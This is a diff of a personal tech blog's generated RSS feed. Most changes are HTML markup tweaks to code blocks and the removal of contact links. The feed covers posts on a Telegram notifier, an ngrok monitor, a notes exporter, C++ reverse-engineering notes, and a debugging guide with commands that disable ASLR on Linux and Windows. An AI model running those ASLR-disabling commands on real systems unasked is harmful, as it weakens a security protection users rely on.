-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sys &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argv
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sys &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argv
 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; telegram
 
 bot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; telegram&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Bot(token&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YOUR_API_KEY&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# FIXME your api key&lt;/span&gt;
@@ -1984,7 +1984,7 @@ bot&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_message(chat_id&
 &lt;p&gt;Below script is designed to be run from cron, thanks to this solution it will be run automatically i.e every 5 minutes:
 &lt;code&gt;*/5 * * * * path/to/monitor.sh&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# monitor.sh&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# monitor.sh&lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
 
 NGROK&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/local/bin/ngrok&amp;#39;&lt;/span&gt;
@@ -2079,9 +2079,9 @@ OLD_STATUS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style
       <guid>/posts/disable-aslr/</guid>
       <description>Linux echo 0 | sudo tee /proc/sys/kernel/randomize_va_space radare2 # disable ASLR &amp;amp; reanalyse dor aslr=no aaa Windows Windows 7  Open RegEdit Goto: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\ Create new value (not a key): MoveImages with value 0. Reboot.  Windows 10 Disable ASLR per file Set-Processmitigation -Name name.exe -Disable ForceRelocateImages Disable ASLR by default  Search in Windows for: “windows defender Security Center” Click on the second icon from the bottom: “App &amp;amp; browser control” Scroll to the bottom and click on: “Exploit protection settings” Set “Force randomization for images “ to OFF.</description>
       <content>&lt;h2 id=&#34;linux&#34;&gt;Linux&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;echo &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; | sudo tee /proc/sys/kernel/randomize_va_space
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;echo &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; | sudo tee /proc/sys/kernel/randomize_va_space
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;radare2&#34;&gt;radare2&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-r2&#34; data-lang=&#34;r2&#34;&gt;# disable ASLR &amp;amp; reanalyse
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-r2&#34; data-lang=&#34;r2&#34;&gt;# disable ASLR &amp;amp; reanalyse
 dor aslr=no
 aaa
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;windows&#34;&gt;Windows&lt;/h2&gt;
@@ -2094,7 +2094,7 @@ aaa
 &lt;/ol&gt;
 &lt;h3 id=&#34;windows-10&#34;&gt;Windows 10&lt;/h3&gt;
 &lt;h4 id=&#34;disable-aslr-per-file&#34;&gt;Disable ASLR per file&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;Set-Processmitigation -Name name.exe -Disable ForceRelocateImages
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;Set-Processmitigation -Name name.exe -Disable ForceRelocateImages
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;disable-aslr-by-default&#34;&gt;Disable ASLR by default&lt;/h4&gt;
 &lt;ol&gt;
 &lt;li&gt;Search in Windows for: “windows defender Security Center”&lt;/li&gt;
@@ -2150,13 +2150,13 @@ aaa
 &lt;h3 id=&#34;move-your-bear-notes&#34;&gt;Move your bear notes&lt;/h3&gt;
 &lt;p&gt;First of all I created a concept of &amp;ldquo;main tag&amp;rdquo;, so if note have multiple tags (i.e &lt;code&gt;tag1/sub1&lt;/code&gt; and &lt;code&gt;tag2/sub2&lt;/code&gt;) we have to choose which tag is more important to us. The &lt;em&gt;main tag&lt;/em&gt; will be actually translated into directory structure in your notes directory and saved there! The rest of the tags will be added into note as YAML meta-data.&lt;/p&gt;
 &lt;p&gt;For example: you have exported &lt;em&gt;bear&lt;/em&gt; note to &lt;code&gt;$BEAR_DIR/note.md&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;# Note
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;# Note
 
 My note
 
 #tag1/sub1 #tag2/sub2
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After exporting this note with my script and selecting &lt;code&gt;#tag1/sub1&lt;/code&gt; as main tag, the note will be saved under &lt;code&gt;$NOTES_DIR/tag1/sub1/note.md&lt;/code&gt; and it will look like this:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;---
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;---
 tags: [&amp;#34;tag1/sub1&amp;#34;, &amp;#34;tag2/sub2&amp;#34;]
 ---
 # Note
@@ -2164,7 +2164,7 @@ tags: [&amp;#34;tag1/sub1&amp;#34;, &amp;#34;tag2/sub2&amp;#34;]
 My note
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;demo&#34;&gt;Demo&lt;/h4&gt;
 &lt;p&gt;Before running &lt;code&gt;export-bear2typora.py&lt;/code&gt; don&amp;rsquo;t forget setup script by editing it:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# config dirs&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# config dirs&lt;/span&gt;
 NOTE_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Notes/&amp;#34;&lt;/span&gt;         &lt;span style=&#34;color:#75715e&#34;&gt;# output dir&lt;/span&gt;
 BEAR_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BearNotes/&amp;#34;&lt;/span&gt;     &lt;span style=&#34;color:#75715e&#34;&gt;# input dir&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Paths are relative to script path, during script execution you can be prompted for tag selection. During this you can also jump into python interactive session and fix tag name if something was wrongly matched (minimum knowledge of python is required) - tags are kept in &lt;code&gt;tags&lt;/code&gt; array.&lt;/p&gt;
@@ -2173,12 +2173,12 @@ BEAR_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style
 &lt;p&gt;This topic is actually nicely described in &lt;a href=&#34;https://github.com/trib0r3/bear2markdowntree#multi-tagging-support&#34;&gt;README&lt;/a&gt;. We can emulate multi-tags structure by symbolic links (but with some problems on Windows and in Typora) or by creating special file which I called &lt;em&gt;index&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;This file should be (re)generated with &lt;code&gt;build-tags.py&lt;/code&gt; each time you decide to put some new file in your directory list.&lt;/p&gt;
 &lt;p&gt;Here you should edit only one variable (if you have &lt;code&gt;NOTES_DIR&lt;/code&gt; relative to home directory):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;HOME_USER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(Path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;home())
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;HOME_USER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(Path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;home())
 NOTES_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HOME_USER &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/Dropbox/Notes/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# FIXME:  add path to your Notes folder (relative to $HOME)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you want to use absoulte path change code to:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;NOTES_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/root/home/notes/&amp;#34;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;NOTES_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/root/home/notes/&amp;#34;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Additionally if you don&amp;rsquo;t want to see some tags, you can add them here:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you want ignore some tags in the final listing add them to this list&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you want ignore some tags in the final listing add them to this list&lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;# WARNING: this feature is actually taking only subtag, &lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;#  Ex#1: you have note with tag: &amp;#34;dev/python/code-snippets&amp;#34;&lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;#    if you decide to ignore tag &amp;#34;dev&amp;#34;, then all subtags (&amp;#34;python&amp;#34;, &amp;#34;code-snippets&amp;#34;)  will be also ignored!&lt;/span&gt;
@@ -2217,7 +2217,7 @@ IGNORE_TAGS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [] &lt;span
 &lt;/ul&gt;
 &lt;h3 id=&#34;inheritance&#34;&gt;Inheritance&lt;/h3&gt;
 &lt;p&gt;Constructors of base class are called 1st in child class, additionally assigment to variables in class definition is put inside constructor:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __thiscall &lt;span style=&#34;color:#a6e22e&#34;&gt;Inherited&lt;/span&gt;(Inherited &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __thiscall &lt;span style=&#34;color:#a6e22e&#34;&gt;Inherited&lt;/span&gt;(Inherited &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;)
 {
   Box((Box &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);
   &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// this was assigned in class definition, not constructor
@@ -2227,7 +2227,7 @@ IGNORE_TAGS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [] &lt;span
 }
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inherited destructors contains destructors of base class:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __thiscall &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;Inherited(Inherited &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __thiscall &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;Inherited(Inherited &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;)
 
 {
   &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;Box((Box &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);
@@ -2236,7 +2236,7 @@ IGNORE_TAGS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [] &lt;span
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;virtuals&#34;&gt;Virtuals&lt;/h3&gt;
 &lt;p&gt;Generally we have the same behaviour like in inheritance, but additionally we have also vtables.&lt;/p&gt;
 &lt;p&gt;The structures of classess contains 1 additional field (at offset 0): &lt;code&gt;vptr&lt;/code&gt; to &lt;code&gt;vtable&lt;/code&gt; structure containing pointers to all virtual methods in this class:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vtable_class_A&lt;/span&gt; {
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vtable_class_A&lt;/span&gt; {
   &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;virtual_func_1&lt;/span&gt;();
   &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;virtual_func_2&lt;/span&gt;();
   &lt;span style=&#34;color:#75715e&#34;&gt;// ...
@@ -2275,13 +2275,11 @@ I created this blog mostly for sharing some interesting stuff from topics of my 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/contact/</guid>
-      <description> [E-Mail] [Twitter] [Github] [Reddit] [BuyMeACoffee]  </description>
+      <description> [Twitter] [Github] [Reddit]  </description>
       <content>&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;mailto:trib0r3@criptext.com&#34;&gt;[E-Mail]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://twitter.com/trib0r3&#34;&gt;[Twitter]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/trib0r3&#34;&gt;[Github]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.reddit.com/user/sskx&#34;&gt;[Reddit]&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.buymeacoffee.com/trib0r3&#34;&gt;[BuyMeACoffee]&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </content>
     </item>
